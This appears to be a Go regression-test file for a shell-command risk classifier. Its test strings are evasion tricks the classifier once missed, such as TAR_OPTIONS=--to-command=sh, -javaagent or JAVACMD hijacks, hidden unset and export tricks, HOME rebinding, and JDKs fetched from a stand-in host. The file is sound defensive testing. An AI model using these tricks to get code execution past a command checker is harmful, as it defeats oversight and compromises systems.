package danger

import (
	"os"
	"slices"
	"testing"
)

// lowersR5 returns the effects of the reference command that the analysis of
// cmd lacks: a command that only adds statements to the reference must keep
// every effect of it.
func lowersR5(cmd, ref string) []RiskClass {
	got := Analyze(cmd).Effects
	var missing []RiskClass
	for _, effect := range Analyze(ref).Effects {
		if effect != Safe && !slices.Contains(got, effect) {
			missing = append(missing, effect)
		}
	}
	return missing
}

// A statement between the export of an option variable and its reader that
// reads as taking the variable out of the environment was honoured: the
// reader kept its own verdict. Real shells keep the variable in forms the
// analysis read as a removal: `export -fn NAME`, `export -n -f NAME` and
// `export -pn NAME` name a function or print the export list and go on, and
// `unset $1 NAME`, `unset "$@" NAME` or `unset * NAME` remove a function when
// the run-time word is -f.
//
// Correct behaviour: once a command line exports or assigns an option
// variable for a reader, the reader is judged with it whatever unset, export
// -n or declare +x statements come between.
func TestRED_UnsetOrUnexportNeverLowersOptionVariable(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	unsetExecEnvR4(t)
	removals := func(name string) []string {
		return []string{
			`unset ` + name, `unset -v ` + name, `export -n ` + name, `declare +x ` + name, `typeset +x ` + name,
			`export -fn ` + name, `export -nf ` + name, `export -n -f ` + name, `export -pn ` + name,
			`set -- -f; unset $1 ` + name, `set -- -f; unset "$@" ` + name, `read x < opt; unset $x ` + name,
			`: ${x:=-f}; unset $x ` + name, `unset * ` + name, `export -n * ` + name, `unset -f ` + name,
			`unset TAR_OPTIONS JAVACMD ` + name, `unset "$@"`, `unset $x`,
			`env unset ` + name, `command unset ` + name, `builtin unset ` + name, `\unset ` + name,
		}
	}
	for _, tc := range []struct{ export, name, reader string }{
		{`export TAR_OPTIONS=--to-command=sh; `, "TAR_OPTIONS", `tar xf x.tar`},
		{`export TAR_OPTIONS=--to-command=sh; `, "TAR_OPTIONS", `nice tar xf x.tar`},
		{`export ZIPOPT=-m; `, "ZIPOPT", `zip a.zip f`},
		{`export JAVA_HOME=/tmp/jdk; `, "JAVA_HOME", `mvn -v`},
		{`export JAVACMD=/tmp/j; `, "JAVACMD", `mvn -v`},
		{`export MAVEN_OPTS=-javaagent:/tmp/x.jar; `, "MAVEN_OPTS", `mvn -v`},
		{`set -a; TAR_OPTIONS=--to-command=sh; `, "TAR_OPTIONS", `tar xf x.tar`},
		{`declare -x TAR_OPTIONS=--to-command=sh; `, "TAR_OPTIONS", `tar xf x.tar`},
	} {
		want := Classify(tc.export + tc.reader)
		if Rank(want) <= Rank(Classify(tc.reader)) {
			t.Fatalf("premise: %q classified %s, no higher than %q", tc.export+tc.reader, want, tc.reader)
		}
		for _, removal := range removals(tc.name) {
			cmd := tc.export + removal + `; ` + tc.reader
			if missing := lowersR5(cmd, tc.export+tc.reader); len(missing) > 0 || Rank(Classify(cmd)) < Rank(want) {
				t.Errorf("Classify(%q) = %s without %v, want at least %s and every effect of the command without the removal", cmd, Classify(cmd), missing, want)
			}
		}
	}
	// Inside the payload of a shell the assignment was given to.
	const inline = `TAR_OPTIONS=--to-command=sh bash -c 'tar xf x.tar'`
	for _, cmd := range []string{
		`TAR_OPTIONS=--to-command=sh bash -c 'unset TAR_OPTIONS; tar xf x.tar'`,
		`TAR_OPTIONS=--to-command=sh bash -c 'export -n TAR_OPTIONS; tar xf x.tar'`,
	} {
		if got, want := Classify(cmd), Classify(inline); Rank(got) < Rank(want) {
			t.Errorf("Classify(%q) = %s, want at least %s", cmd, got, want)
		}
	}
	// With the name in odek's own environment a plain assignment is exported.
	t.Setenv("TAR_OPTIONS", "-v")
	want := Classify(`TAR_OPTIONS=--to-command=sh; tar xf x.tar`)
	for _, removal := range removals("TAR_OPTIONS") {
		cmd := `TAR_OPTIONS=--to-command=sh; ` + removal + `; tar xf x.tar`
		if got := Classify(cmd); Rank(got) < Rank(want) {
			t.Errorf("with TAR_OPTIONS inherited: Classify(%q) = %s, want at least %s", cmd, got, want)
		}
	}
	os.Unsetenv("TAR_OPTIONS")
	// A removal that may not run, runs elsewhere or runs after the reader.
	const export = `export TAR_OPTIONS=--to-command=sh; `
	plain := Classify(`tar xf x.tar`)
	for _, cmd := range []string{
		export + `unset TAR_OPTIONS; export TAR_OPTIONS=--to-command=sh; tar xf x.tar`,
		`export TAR_OPTIONS=-v; export -n TAR_OPTIONS=--to-command=sh; tar xf x.tar`,
		`export -fn TAR_OPTIONS=--to-command=sh; tar xf x.tar`,
		export + `export -n TAR_OPTIONS; export TAR_OPTIONS; tar xf x.tar`,
		export + `unset TAR_OPTIONS; TAR_OPTIONS=--to-command=sh tar xf x.tar`,
		export + `unset TAR_OPTIONS; TAR_OPTIONS=--to-command=sh; tar xf x.tar`,
		export + `unset TAR_OPTIONS; . ./env.sh; tar xf x.tar`,
		export + `if test -f nope; then unset TAR_OPTIONS; fi; tar xf x.tar`,
		export + `(unset TAR_OPTIONS); tar xf x.tar`,
		export + `{ unset TAR_OPTIONS; }; tar xf x.tar`,
		export + `false && unset TAR_OPTIONS; tar xf x.tar`,
		export + `true || unset TAR_OPTIONS; tar xf x.tar`,
		export + `unset TAR_OPTIONS | cat; tar xf x.tar`,
		export + `unset TAR_OPTIONS & tar xf x.tar`,
		export + `f() { unset TAR_OPTIONS; }; tar xf x.tar; f`,
		export + `for i in; do unset TAR_OPTIONS; done; tar xf x.tar`,
		export + `bash -c 'unset TAR_OPTIONS'; tar xf x.tar`,
		export + `readonly TAR_OPTIONS; unset TAR_OPTIONS; tar xf x.tar`,
		export + `unset 'TAR_OPTIONS[1]'; tar xf x.tar`,
		export + `unset TAR; tar xf x.tar`,
		export + `echo "$(tar xf x.tar)"; unset TAR_OPTIONS`,
		export + `timeout 1 export -n TAR_OPTIONS; tar xf x.tar`,
		export + `/usr/bin/unset TAR_OPTIONS; tar xf x.tar`,
		"alias unset=true\n" + export + "\nunset TAR_OPTIONS\ntar xf x.tar",
		`unset() { :; }; ` + export + `unset TAR_OPTIONS; tar xf x.tar`,
		export + `tar xf x.tar; unset TAR_OPTIONS`,
	} {
		if got := Classify(cmd); Rank(got) <= Rank(plain) {
			t.Errorf("Classify(%q) = %s, want above %s: the variable can still reach tar", cmd, got, plain)
		}
	}
}

// `set -a` was recognised only while every word before it started with '-',
// and `-eo allexport` was read as a cluster with no option name: `set +e -a`,
// `set -e +x -a`, `set +o errexit -o allexport` and `set -eo allexport` turn
// allexport on in sh, dash and bash, yet the assignment after them did not
// count as exported and the reader kept its own verdict.
//
// Correct behaviour: every option word of set is read, a cluster with o takes
// its name from the next word, and an option word only known at run time may
// turn allexport on.
func TestRED_SetAllexportInEveryOptionWord(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	unsetExecEnvR4(t)
	tails := []struct{ tail, ref string }{
		{`TAR_OPTIONS=--to-command=sh; tar xf x.tar`, `set -a; TAR_OPTIONS=--to-command=sh; tar xf x.tar`},
		{`JAVA_HOME=/tmp/jdk; mvn -v`, `set -a; JAVA_HOME=/tmp/jdk; mvn -v`},
		{`MAVEN_OPTS=-javaagent:/tmp/x.jar; mvn -v`, `set -a; MAVEN_OPTS=-javaagent:/tmp/x.jar; mvn -v`},
	}
	for _, set := range []string{
		`set +e -a`, `set -e +x -a`, `set +o errexit -o allexport`, `set -eo allexport`, `set -oe allexport`,
		`set +x -ea`, `set -o errexit -a`, `set -eo pipefail -a`, `set -euo pipefail -o allexport`,
		`set -o pipefail -o allexport`, `set +a -a`, `set -a +a`, `set -a; set +a`, `set -a --`, `set -a -- x`,
		`set $x`, `set -$x`, `set "$@"`, `set -o $x`, `set -o "$(cat f)"`, `set $(cat f)`, `set +e $x`,
		`x=-a; set $x`, `set -o ALL_EXPORT`,
	} {
		for _, tc := range tails {
			want := Classify(tc.ref)
			if Rank(want) <= Rank(Classify(tc.tail)) {
				t.Fatalf("premise: %q classified %s", tc.ref, want)
			}
			cmd := set + "; " + tc.tail
			if got := Classify(cmd); Rank(got) < Rank(want) {
				t.Errorf("Classify(%q) = %s, want at least %s (as %q)", cmd, got, want, tc.ref)
			}
		}
	}
	// Positional parameters and other options do not turn allexport on.
	for _, set := range []string{`set -- -a`, `set -e`, `set -o pipefail`, `set -euo pipefail`, `set +a`, `set x -a`, `set - -a`, `set -- $x`} {
		for _, tc := range tails {
			cmd := set + "; " + tc.tail
			if got, want := Classify(cmd), Classify(tc.tail); got != want {
				t.Errorf("Classify(%q) = %s, want %s (the verdict of %q)", cmd, got, want, tc.tail)
			}
		}
	}
}

// The tilde of a java binary variable was expanded with the home directory
// odek inherited although the command line had given HOME another value, so
// `HOME=/tmp/x; JAVA_HOME=~/.sdkman/candidates/java/x mvn -v` was judged as a
// JDK in the per-user install directory while the shell runs /tmp/x/...
//
// Correct behaviour: once the command line binds, reads or unsets HOME, or may
// have, a java path spelled with ~ or $HOME is a value only known at run time.
func TestRED_JavaPathTildeAfterHomeRebound(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	unsetExecEnvR4(t)
	const jdk = `.sdkman/candidates/java/x`
	if got := Classify(`JAVA_HOME=~/` + jdk + ` mvn -v`); got != Classify(`mvn -v`) {
		t.Fatalf("premise: the per-user JDK directory classified %s", got)
	}
	readers := []string{
		`JAVA_HOME=~/` + jdk + ` mvn -v`,
		`export JAVA_HOME=~/` + jdk + `; mvn -v`,
		`JAVACMD=~/` + jdk + `/bin/java mvn -v`,
		`export JAVACMD=~/` + jdk + `/bin/java; ant -version`,
		`JAVA_HOME=$HOME/` + jdk + ` mvn -v`,
		`JAVA_HOME=${HOME}/` + jdk + ` mvn -v`,
		`JAVA_HOME=~/` + jdk + ` java -version`,
	}
	for _, rebind := range []string{
		`HOME=/tmp/x`, `export HOME=/tmp/x`, `h=/tmp/x; HOME=$h`, `read HOME < f`, `read -r HOME < f`, `unset HOME`,
		`declare HOME=/tmp/x`, `declare -x HOME=/tmp/x`, `printf -v HOME %s /tmp/x`, `: ${HOME:=/tmp/x}`, `: ${HOME=/tmp/x}`,
		`eval 'HOME=/tmp/x'`, `eval HOME=/tmp/x`, `HOME+=/../../tmp/x`, `declare -n r=HOME; r=/tmp/x`,
		`v=HOME; read $v < f`, `v=HOME; export $v=/tmp/x`, `getopts a HOME`, `HOME=/usr/lib/jvm; eval 'HOME=/tmp/x'`,
		`mapfile HOME < f`, `. ./env.sh`,
	} {
		for _, reader := range readers {
			cmd := rebind + `; ` + reader
			if got := Classify(cmd); Rank(got) < Rank(CodeExecution) {
				t.Errorf("Classify(%q) = %s, want at least code_execution", cmd, got)
			}
		}
	}
	for _, cmd := range []string{
		`HOME=/tmp/x JAVA_HOME=~/` + jdk + ` mvn -v`,
		`env HOME=/tmp/x JAVA_HOME=~/` + jdk + ` mvn -v`,
		`for HOME in /tmp/x; do JAVA_HOME=~/` + jdk + ` mvn -v; done`,
		`f() { HOME=/tmp/x; }; f; JAVA_HOME=~/` + jdk + ` mvn -v`,
		`JAVA_HOME=~/` + jdk + ` mvn -v "$(HOME=/tmp/x)"; HOME=/tmp/x`,
		`bash -c 'HOME=/tmp/x'; HOME=/tmp/x; JAVA_HOME=~/` + jdk + ` mvn -v`,
	} {
		if got := Classify(cmd); Rank(got) < Rank(CodeExecution) {
			t.Errorf("Classify(%q) = %s, want at least code_execution", cmd, got)
		}
	}
	// Other names that end in HOME, and a HOME that is only read, change nothing.
	// (The commands in front are safe, so the per-user directory stays exempt.)
	for _, cmd := range []string{
		`XDG_CONFIG_HOME=/tmp/x; JAVA_HOME=~/` + jdk + ` mvn -v`,
		`echo "$HOME"; JAVA_HOME=~/` + jdk + ` mvn -v`,
		`MAVEN_HOME=/opt/maven; JAVA_HOME=$HOME/` + jdk + ` mvn -v`,
		`export JAVA_HOME=~/` + jdk + `; mvn -v`,
	} {
		if got, want := Classify(cmd), Classify(`mvn -v`); got != want {
			t.Errorf("Classify(%q) = %s, want %s", cmd, got, want)
		}
	}
}

// A java binary outside the system JDK directories was exempt unless a path
// the same command line wrote covered it, and the writers were listed one by
// one: `git clone URL ~/.sdkman/candidates/java/x; JAVA_HOME=~/.sdkman/
// candidates/java/x mvn -v` (also git -C, aria2c -d, cpio -D, tar
// --one-top-level, base64 -o, openssl -out, touch, chmod) kept the verdict of
// the clone.
//
// Correct behaviour: such a binary is exempt only when nothing else in the
// command line could have prepared it, that is when every other command of
// the line is safe; the system JDK directories stay exempt.
func TestRED_NonSystemJavaBinaryExemptOnlyInASafeCommandLine(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	t.Chdir(t.TempDir())
	unsetExecEnvR4(t)
	plain := Classify(`mvn -v`)
	const sdk, asdf = `~/.sdkman/candidates/java/x`, `~/.asdf/installs/java/x`
	for _, cmd := range []string{
		`git clone https://e.example/x ` + sdk + `; JAVA_HOME=` + sdk + ` mvn -v`,
		`git clone https://e.example/x ` + asdf + ` && export JAVA_HOME=` + asdf + ` && mvn -v`,
		`git -C ~/.sdkman/candidates/java clone https://e.example/x; JAVA_HOME=` + sdk + ` mvn -v`,
		`aria2c -d ` + sdk + `/bin https://e.example/java; JAVA_HOME=` + sdk + ` mvn -v`,
		`cpio -idm -D ` + sdk + ` < jdk.cpio; JAVA_HOME=` + sdk + ` mvn -v`,
		`tar xf jdk.tar --one-top-level=` + sdk + `; JAVA_HOME=` + sdk + ` mvn -v`,
		`base64 -d -o ` + sdk + `/bin/java j.b64; JAVA_HOME=` + sdk + ` mvn -v`,
		`openssl enc -d -in j.enc -out ` + sdk + `/bin/java; JAVA_HOME=` + sdk + ` mvn -v`,
		`truncate -s 0 ` + sdk + `/bin/java; JAVA_HOME=` + sdk + ` mvn -v`,
		`touch ` + sdk + `/bin/java; JAVA_HOME=` + sdk + ` mvn -v`,
		`chmod +x ` + sdk + `/bin/java; JAVA_HOME=` + sdk + ` mvn -v`,
		`cd ~/.sdkman/candidates/java && git clone https://e.example/x; JAVA_HOME=` + sdk + ` mvn -v`,
		`curl -sO https://e.example/java; JAVACMD=~/tools/jdk/bin/java mvn -v`,
		`wget -q https://e.example/jdk.tgz; JAVA_HOME=/opt/vendor/jdk mvn -v`,
		`export JAVA_HOME=` + sdk + `; git clone https://e.example/x "$JAVA_HOME"; mvn -v`,
		// The writer runs first although it is written after the reader.
		`(sleep 5; JAVA_HOME=` + sdk + ` mvn -v) & git clone https://e.example/x ` + sdk,
		`JAVA_HOME=` + sdk + ` mvn -v "$(git clone https://e.example/x ` + sdk + `)"`,
		`f() { JAVA_HOME=` + sdk + ` mvn -v; }; git clone https://e.example/x ` + sdk + `; f`,
		`if git clone https://e.example/x ` + sdk + `; then JAVA_HOME=` + sdk + ` mvn -v; fi`,
		`git clone https://e.example/x ` + sdk + ` | JAVA_HOME=` + sdk + ` mvn -v`,
		`eval 'git clone https://e.example/x ` + sdk + `'; JAVA_HOME=` + sdk + ` mvn -v`,
		`git clone https://e.example/x ` + sdk + `; env JAVA_HOME=` + sdk + ` mvn -v`,
		`git clone https://e.example/x ` + sdk + `; JAVA_HOME=` + sdk + ` sh mvnw -v`,
		// Another reader that writes can prepare the JDK as well.
		`JAVA_HOME=~/.sdkman/candidates/java/a jar xf j.jar; JAVA_HOME=` + sdk + ` mvn -v`,
	} {
		if got := Classify(cmd); Rank(got) < Rank(CodeExecution) {
			t.Errorf("Classify(%q) = %s, want at least code_execution", cmd, got)
		}
	}
	// With only safe commands around it the launcher keeps its verdict.
	for _, cmd := range []string{
		`JAVA_HOME=~/.sdkman/candidates/java/current mvn -v`,
		`export JAVA_HOME=$HOME/.asdf/installs/java/temurin-21; mvn -v`,
		`echo building; JAVA_HOME=~/.jenv/versions/17 mvn -v`,
		`echo building && JAVA_HOME=~/.jenv/versions/17 mvn -v && echo done`,
		`export JAVA_HOME=~/.sdkman/candidates/java/current; mvn -v; mvn -v`,
		`JAVACMD=~/tools/jdk/bin/java mvn -v`,
		`JAVA_HOME=/opt/vendor/jdk mvn -v`,
		`if test -d ~/.jenv; then JAVA_HOME=~/.jenv/versions/17 mvn -v; fi`,
		// The system directories stay exempt whatever else runs.
		`git clone https://e.example/x; JAVA_HOME=/usr/lib/jvm/java-21 mvn -v; true`,
	} {
		want := plain
		if cmd[0] == 'g' {
			want = Classify(`git clone https://e.example/x`)
		}
		if got := Classify(cmd); got != want {
			t.Errorf("Classify(%q) = %s, want %s", cmd, got, want)
		}
	}
	// A reader's own effects do not count against its own JDK.
	if got, want := Classify(`JAVA_HOME=~/.sdkman/candidates/java/17 javac A.java`), Classify(`javac A.java`); got != want {
		t.Errorf("javac with a per-user JDK = %s, want %s", got, want)
	}
}
